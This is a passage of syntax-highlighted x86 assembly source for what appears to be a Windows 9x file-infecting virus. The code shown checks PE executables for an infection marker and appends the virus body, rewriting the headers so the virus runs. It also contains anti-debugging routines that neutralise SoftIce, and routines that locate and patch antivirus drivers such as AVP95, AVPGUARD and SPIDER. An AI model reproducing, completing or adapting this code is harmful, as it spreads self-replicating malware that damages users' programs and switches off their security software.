        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; eax = file handle</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delta4</span><span class="sc0">
</span><span class="sc5">Delta4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta4</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D600h</span><span class="sc0">     </span><span class="sc1">; R0_READFILE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">; bytes to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">        </span><span class="sc1">; position in file</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PEHead</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; buffer to read to</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileI0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D600h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PEHead</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Header</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileI0</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00004550h</span><span class="sc0">      </span><span class="sc1">; make sure it is a PE</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">44h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'1EAD'</span><span class="sc0">       </span><span class="sc1">; already infected?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Close</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">44h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'1EAD'</span><span class="sc0">       </span><span class="sc1">; inf.marker</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">IBase</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get last section of header</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D800h</span><span class="sc0">         </span><span class="sc1">; get file size</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileI0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; fuck i`m lazZzzy</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">; fix vxdcall</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">                      </span><span class="sc1">; fixed vxdcallz</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VxDTable</span><span class="sc4">]</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VxDTabSize</span><span class="sc0">
</span><span class="sc6">Loop</span><span class="sc10">$</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20CDh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc6">Loop</span><span class="sc10">$</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D601h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">VxDcall4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0032h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0040h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Skip</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">Skip</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VirusSize</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D601h</span><span class="sc0">     </span><span class="sc1">; write the modified header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">       </span><span class="sc1">; to the file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PEHead</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Header</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileI0</span><span class="sc0">

</span><span class="sc1">; close filez &amp; restore attributes</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="sc0">

</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D700h</span><span class="sc0">     </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileI0</span><span class="sc0">

</span><span class="sc5">atribut</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">      </span><span class="sc1">; restore its attributes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileI0</span><span class="sc0">

</span><span class="sc5">Bred</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; fuck softice</span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~~</span><span class="sc0">

</span><span class="sc5">fuckSoftIce</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; int 01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fuckint</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; int 03h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fuckint</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fuckint</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">     </span><span class="sc1">; softice signature</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__skipfuck</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">  </span><span class="sc1">; -//-</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__skipfuck</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0CFh</span><span class="sc0">    </span><span class="sc1">; iret</span><span class="sc0">
</span><span class="sc5">__skipfuck</span><span class="sc4">:</span><span class="sc0">     
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; kill AV VXD </span><span class="sc0">
</span><span class="sc1">; ~~~~~~~~~~~</span><span class="sc0">

</span><span class="sc5">killavxd</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc1">;VxDcall VXDLDR, GetDeviceList</span><span class="sc0">
</span><span class="sc5">VxDcall5</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0005h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0027h</span><span class="sc0">

</span><span class="sc5">__kavxd_scanvxd</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__kavxd_continue</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Name_0</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'DIPS'</span><span class="sc0">        </span><span class="sc1">; SPIDER</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__kavxd_patch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'9PVA'</span><span class="sc0">        </span><span class="sc1">; AVP95</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__kavxd_patch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'GPVA'</span><span class="sc0">        </span><span class="sc1">; AVPGUARD</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__kavxd_patch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc12">'59KG'</span><span class="sc0">        </span><span class="sc1">; GK95</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__kavxd_patch</span><span class="sc0">

</span><span class="sc5">__kavxd_continue</span><span class="sc4">:</span><span class="sc0">       
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__kavxd_scanvxd</span><span class="sc0">

                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__kavxd_patch</span><span class="sc4">:</span><span class="sc0">          
        </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc5">pusho</span><span class="sc0">   </span><span class="sc5">kavxd_kill_moveax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000D500h</span><span class="sc0">     </span><span class="sc1">; R0_OPENCREATFILE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__kavxd_fuck</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000D501h</span><span class="sc0">     </span><span class="sc1">; R0_OPENCREAT_IN_CONTEXT</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__kavxd_fuck</span><span class="sc0">

</span><span class="sc1">;  © ¤  ª á¯¥àáª¨©,  © ¤  fucking shit!</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">;  avpguard</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__skip1</span><span class="sc0">

</span><span class="sc1">;               mov     eax, 1+1Bh          ; unload vxd</span><span class="sc0">
</span><span class="sc1">;               call    dword ptr [ebx+18h] ; control_proc_0</span><span class="sc0">

                </span><span class="sc5">pusho</span><span class="sc0">   </span><span class="sc5">kavxd_kill_cd20</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002A001Ah</span><span class="sc0">     </span><span class="sc1">; VWIN32_SysErrorBox</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__kavxd_fuck</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002A000Eh</span><span class="sc0">     </span><span class="sc1">; VWIN32_SetWin32Event</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__kavxd_fuck</span><span class="sc0">

                </span><span class="sc5">pusho</span><span class="sc0">   </span><span class="sc5">kavxd_kill_badcall</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

